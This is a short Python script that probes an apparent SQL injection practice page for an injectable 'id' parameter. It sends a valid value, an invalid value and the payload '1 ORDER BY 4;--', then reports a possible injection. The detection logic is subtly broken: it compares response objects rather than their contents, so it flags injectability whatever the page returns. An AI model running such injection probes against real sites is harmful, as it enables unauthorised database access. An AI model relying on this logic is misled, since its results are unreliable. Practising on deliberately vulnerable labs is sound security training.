import urllib.parse
import requests

url = 'https://www.zixem.altervista.org/SQLi/level1.php'
parameter = 'id'
correct_value = '1'
incorrect_value = 'dzadhazoiud'

correct_response = requests.get(f'{url}?{parameter}={correct_value}')
incorrect_response = requests.get(f'{url}?{parameter}={incorrect_value}')

payloads = ['1 ORDER BY 4;--']

for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)
    payload_response = requests.get(f'{url}?{parameter}={encoded_payload}')
    if payload_response != correct_response and payload_response != incorrect_response:
        print(f'Parameter "{parameter}" might be injectable with payload : "{payload}" (URL encoded : {encoded_payload}). ({payload_response.status_code})')